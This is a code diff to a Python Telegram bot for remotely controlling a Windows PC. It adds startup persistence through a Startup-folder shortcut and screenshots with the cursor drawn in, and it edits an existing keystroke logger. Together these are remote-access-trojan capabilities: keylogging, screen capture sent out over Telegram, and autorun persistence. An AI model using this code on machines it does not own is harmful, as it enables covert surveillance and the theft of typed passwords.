@@ -1,6 +1,4 @@
 ################################################################################ modules
-from fileinput import close
-from tempfile import TemporaryFile
 from inputData import getData, Data
 
 ################################################################################ system
@@ -62,8 +60,17 @@ import pickle
 
 ################################################################################ __download flie from browser
 from pySmartDL import SmartDL
-################################################################################ __ DB
+################################################################################ __DB
 import psycopg2
+
+################################################################################ __autorun
+from pathlib import Path
+from win32com.client import Dispatch
+import pythoncom
+
+################################################################################ __screenshot with mouse
+import PIL
+
 
 ################################################################################ ToDo-list
 # spotify control
@@ -134,17 +141,18 @@ count = 0
 
 
 
+
 ################################################################################* __start
 @bot.message_handler(commands = ['start'])
 def Start(message):
     if message.from_user.username != data.USER:
         Warn(message)
         return
-        
-    bot.send_message(message.chat.id, '🚀  Bot launched')
-    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown',reply_markup = home_keyboard)
+    
+    bot.send_message(message.chat.id, '🚀 Bot launched')
+    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')
 
- 
+
 
 ################################################################################* help
 @bot.message_handler(commands = ['help'])
@@ -166,7 +174,7 @@ def Help(message):
 *⏩  /next* - Next track\n
 *➕  /add_app* - Add application to list\n
 *➖  /remove_app* - Remove application from list\n
-*🧾  /app_list* - List of applications\n
+*📃  /app_list* - List of applications\n
 *👟  /open_app [app name]* - Open application\n
 *🌐  /browser* - Open URL in browser\n
 *🔍  /search* - Search in browser\n
@@ -196,14 +204,24 @@ def Help(message):
 *🗳️  /msgbox* - Displays a message on the PC screen\n
 *⚙️  /info* - Show PC info\n
 *🖥️  /status* - Show PC status\n
+*🏃‍♀️  /autorun* - Run the bot after turning on the PC\n
+*🚫  /autorun_off* - Disable bot autorun\n
 *⛔  /stop* - Stop bot\n
     ''', parse_mode = 'Markdown')
 
 
 # buttons
+# noneBtn types.InlineKeyboardMarkup()
+
+# __menu
+menu_keyboadr = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
+btnWatch = types.KeyboardButton('📺 Music or movie')
+
+menu_keyboadr.row(btnWatch)
+
 
 # mouseButton
-mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
+mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = True)
 btnup = types.KeyboardButton('⬆️')
 btndown = types.KeyboardButton('⬇️')
 btnLeft = types.KeyboardButton('⬅️')
@@ -216,49 +234,53 @@ mouse_keyboard.row(btnLeft, btnClick, btnRight)
 mouse_keyboard.row(btndown)
 mouse_keyboard.row(btncurs, btnCancel)
 
+delButtons = types.ReplyKeyboardRemove()
+# #homeButton
 
-#homeButton
-
-home_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
+# home_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
 
 
-pg = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
-btnShutdown = types.KeyboardButton('⚠️ Shutdown')
-btnReboot = types.KeyboardButton('🔄 Reboot')
-btnSleep = types.KeyboardButton('💤 Sleep')
-btnLock = types.KeyboardButton('🔒 Lock')
+# pg = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
+# btnShutdown = types.KeyboardButton('⚠️ Shutdown')
+# btnReboot = types.KeyboardButton('🔄 Reboot')
+# btnSleep = types.KeyboardButton('💤 Sleep')
+# btnLock = types.KeyboardButton('🔒 Lock')
 
-home_keyboard.row(btnShutdown, btnReboot,btnSleep,btnLock)
+# home_keyboard.row(btnShutdown, btnReboot,btnSleep,btnLock)
 
-#contol music and video
-pgControlWatch = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
-btnVol = types.KeyboardButton('🔊 Volume')
-btnBright = types.KeyboardButton('☀️ Brightness')
-btnYoutube = types.KeyboardButton('▶️ Youtube')
-btnSearch = types.KeyboardButton('🔍 Search')
-btnBrowser = types.KeyboardButton('🌐 Browser')
-btnFullscreen = types.KeyboardButton('📺\ Fullscreen')
-btnFullmovie = types.KeyboardButton('📺 Fullmovie')
-btnPrev = types.KeyboardButton('⏪ Prev')
-btnPause = types.KeyboardButton('⏯\n Pause')
-btnNext = types.KeyboardButton('⏩ Next')
-btnBack = types.KeyboardButton('🔙 Back')
-btnClose = types.KeyboardButton('❌ Close app')
+# #contol music and video
+# pgControlWatch = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
+# btnVol = types.KeyboardButton('🔊 Volume')
+# btnBright = types.KeyboardButton('☀️ Brightness')
+# btnYoutube = types.KeyboardButton('▶️ Youtube')
+# btnSearch = types.KeyboardButton('🔍 Search')
+# btnBrowser = types.KeyboardButton('🌐 Browser')
+# btnFullscreen = types.KeyboardButton('📺\ Fullscreen')
+# btnFullmovie = types.KeyboardButton('📺 Fullmovie')
+# btnPrev = types.KeyboardButton('⏪ Prev')
+# btnPause = types.KeyboardButton('⏯\n Pause')
+# btnNext = types.KeyboardButton('⏩ Next')
+# btnBack = types.KeyboardButton('🔙 Back')
+# btnClose = types.KeyboardButton('❌ Close app')
 
-pgControlWatch.row(btnYoutube,btnSearch,btnBrowser)
-pgControlWatch.row(btnBright,btnVol,btnFullmovie)
-pgControlWatch.row(btnPrev,btnPause,btnNext)
-pgControlWatch.row(btnBack,btnFullscreen,btnClose)
+# pgControlWatch.row(btnYoutube,btnSearch,btnBrowser)
+# pgControlWatch.row(btnBright,btnVol,btnFullmovie)
+# pgControlWatch.row(btnPrev,btnPause,btnNext)
+# pgControlWatch.row(btnBack,btnFullscreen,btnClose)
+
+
 
 ################################################################################* __screenshot
 @bot.message_handler(commands = ['screenshot', 'screen'])
 def Screenshot(message):
     global count
-    try:
-        if message.from_user.username != data.USER:
-            Warn(message)
-            return
-            
+    count += 1
+    
+    if message.from_user.username != data.USER:
+        Warn(message)
+        return
+
+    try:        
         bot.send_chat_action(message.chat.id ,'upload_photo')
         bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
         with mss() as screen:
@@ -267,9 +289,25 @@ def Screenshot(message):
             return bot.send_message(message.chat.id, '*🏞  Error*, screenshot not found', parse_mode = 'Markdown')
         bot.send_document(message.chat.id, open(f'Screenshot{count}.png', 'rb'))
         os.remove(f'Screenshot{count}.png')
-        count += 1
+        
     except:
         return bot.send_message(message.chat.id, '*⛔  Error occurred*', parse_mode = 'Markdown')
+
+def screenWithMouse(message):
+    
+    try:
+        currentMouseX, currentMouseY  =  mouse.get_position()
+        img = PIL.ImageGrab.grab()
+        img.save("screen.png", "png")
+        img = PIL.Image.open("screen.png")
+        draw = PIL.ImageDraw.Draw(img)
+        draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10), fill="white", outline="black")
+        img.save("screen_with_mouse.png", "PNG")
+        bot.send_photo(message.chat.id, open("screen_with_mouse.png", "rb"))
+        os.remove("screen.png")
+        os.remove("screen_with_mouse.png")
+    except:
+        bot.send_message(message.chat.id,'*⛔  Error occurred*', parse_mode = 'Markdown')
 
 
 
@@ -307,19 +345,18 @@ def onRelease(key):
         keyloggerFlag = False
         return False
 def writeFile(keys):
-    with open('Logs.txt', 'a') as f:
+    with open('Logs.txt', 'a') as file:
         for key in keys:
             k = str(key).replace('\'', '')
-            print(key)
             if k.find('enter') > 0:
-                f.write('[ENTER]\n')
+                file.write('[ENTER]\n')
             elif k.find('space') > 0:
-                f.write(' ')
+                file.write(' ')
             elif k.find('Key.') != -1:
                 k = k.replace('Key.', '[') + ']'
-                f.write(k.upper())
+                file.write(k.upper())
             elif k.find('Key') == -1:
-                f.write(k)
+                file.write(k)
 
 
 ################################################################################* __write text
@@ -1188,36 +1225,46 @@ def Mouse(message):
 def Mouse_process(message):
     try:
         if message.text == "⬆️":
+            bot.send_chat_action(message.chat.id ,'upload_photo')
             currentMouseX,  currentMouseY  =  mouse.get_position()
             mouse.move(currentMouseX,  currentMouseY - curs)
             bot.register_next_step_handler(message, Mouse_process)
-            # screen_process(message)
-
+            screenWithMouse(message)
         elif message.text == "⬇️":
+            bot.send_chat_action(message.chat.id ,'upload_photo')
+            
             currentMouseX,  currentMouseY  =  mouse.get_position()
             mouse.move(currentMouseX,  currentMouseY + curs)
             bot.register_next_step_handler(message, Mouse_process)
-            # screen_process(message)
+            screenWithMouse(message)
 
         elif message.text == "⬅️":
+            bot.send_chat_action(message.chat.id ,'upload_photo')
+            
             currentMouseX,  currentMouseY  =  mouse.get_position()
             mouse.move(currentMouseX - curs,  currentMouseY)
             bot.register_next_step_handler(message, Mouse_process)
-            # screen_process(message)
+            screenWithMouse(message)
+
 
         elif message.text == "➡️":
+            bot.send_chat_action(message.chat.id ,'upload_photo')
+            
             currentMouseX,  currentMouseY  =  mouse.get_position()
             mouse.move(currentMouseX + curs,  currentMouseY)
             bot.register_next_step_handler(message, Mouse_process)
-            # screen_process(message)
+            screenWithMouse(message)
+
 
         elif message.text == "🆗":
+            bot.send_chat_action(message.chat.id ,'upload_photo')
             mouse.click()
             bot.register_next_step_handler(message, Mouse_process)
-            # screen_process(message)
+            screenWithMouse(message)
+           
             
-        elif message.text == '⛔':
-            bot.send_message(message.chat.id, '🛑  *Mouse control* is terminated', parse_mode = 'Markdown' )
+        elif message.text == '⛔ Stop':
+            bot.send_message(message.chat.id, '🛑  *Mouse control* is terminated', parse_mode = 'Markdown',reply_markup = delButtons)
         elif message.text == 'Specify the cursor range':
             bot.send_chat_action(message.chat.id, 'typing')
             bot.send_message(message.chat.id, f"Specify a new cursor range, now this value is equal to *{str(curs)}px*", parse_mode = 'Markdown')
@@ -1229,13 +1276,14 @@ def MouseSettings_process(message):
         global curs
         if message.text.isdigit():
             curs = int(message.text)
-            bot.send_message(message.chat.id, f"✅ Changed successfully", reply_markup = mouse_keyboard)
+            bot.send_message(message.chat.id, f"✅ Changed successfully")
             bot.register_next_step_handler(message, Mouse_process)
         else:
             bot.send_message(message.chat.id, "⛔ Incorrect value", reply_markup = mouse_keyboard)
             bot.register_next_step_handler(message, Mouse_process)
     except:
         return bot.send_message(message.chat.id, '*⛔  Error occurred*', parse_mode = 'Markdown')
+
 
 
 ################################################################################* __kill process
@@ -1256,6 +1304,7 @@ def Kill_process(message):
             bot.send_message(message.chat.id,'⛔ Process not found', parse_mode = 'Markdown')
     except:
         return bot.send_message(message.chat.id, '*⛔  Error occurred*', parse_mode = 'Markdown')
+
 
 
 ################################################################################* __message box
@@ -1280,16 +1329,82 @@ def Msgbox_process(message):
         return bot.send_message(message.chat.id, '*⛔  Error occurred*', parse_mode = 'Markdown')
 def MsgBox_thread(message):
     MessageBox(None, message.text, 'PC Control Bot', 0)
+
+
+   
+
+
+################################################################################* __ autorun
+@bot.message_handler(commands = ['autorun'])
+def startAutoRun(message):
+    try:
+        pathToStartup = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PC Control Bot Host.lnk'
+        if not os.path.exists(pathToStartup):
+      
+            abs_file_name = os.path.abspath('.') + '\\host\\host.exe'
+            pathToFile = Path(abs_file_name)
+            
+            create_shortcut(
+                file_name = pathToStartup,
+                target = str(pathToFile),
+                work_dir = str(pathToFile.parent),
+                arguments ='/cmd {%s} -new_console' % 'PС Control Bot Host',
+            )
+            bot.send_message(message.chat.id, '✅ bot is added to autorun')
+        else:
+            bot.send_message(message.chat.id, '⛔ bot is already in autorun')
+    except:
+        bot.send_message(message.chat.id, '⛔ error occurred')
+def create_shortcut(file_name: str, target: str, work_dir: str, arguments: str = ''):
+    pythoncom.CoInitialize()
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortCut(file_name)
+    shortcut.TargetPath = target
+    shortcut.Arguments = arguments
+    shortcut.WorkingDirectory = work_dir
+    shortcut.save()
+
+
+
+################################################################################* __autorun_off
+@bot.message_handler(commands = ['autorun_off'])
+def stopAutoRun(message):
+    PATH = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PC Control Bot Host.lnk'
     
+    if os.path.exists(PATH):
+        os.remove(PATH)
+        bot.send_message(message.chat.id, '✅ *PC Control Bot Host* is removed from the *Start Menu*', parse_mode = 'Markdown')
+    else:
+        bot.send_message(message.chat.id, '⛔ *PC Control Bot Host* is not added to the *Start Menu*', parse_mode = 'Markdown')
+
+
+# @bot.message_handler(content_types = 'text')
+# def menu_process(message):
+#     text = message.text
+    
+#     if text == '📺 Music or movie':
+#        bot.send_message(message.chat.id, f'👟 Moved to category *{text}*',parse_mode = 'Markdown',reply_markup = pgControlWatch)
+#        bot.register_next_step_handler(message, watch_process)
+#     elif text == '1':
+#         pass
+# def watch_process(message):
+#     text = message.text
+#     if text == '▶️ Youtube':
+#         bot.send_message(message.chat.id, 'Enter the URL')
+#         bot.register_next_step_handler(message, Youtube_process)
+#         bot.register_next_step_handler(message, watch_process)
+#     elif text == '🔙 Back':
+#    #    bot.send_message(message.chat.id, f'👟 Moved to *Menu*',parse_mode = 'Markdown',reply_markup = menu_keyboadr)
+#        bot.register_next_step_handler(message, menu_process)
+
+
+
 
 ################################################################################ infinite polling
 
 if __name__ == '__main__':
     while True:
         try:
-            bot.polling(none_stop = True)
-        except Exception as e:
-            time.sleep(3)
-            print(e)
-
-        
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except:
+            time.sleep(2)
